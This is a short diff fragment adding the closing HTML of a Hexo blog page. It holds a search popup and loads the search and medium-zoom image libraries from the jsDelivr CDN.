+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
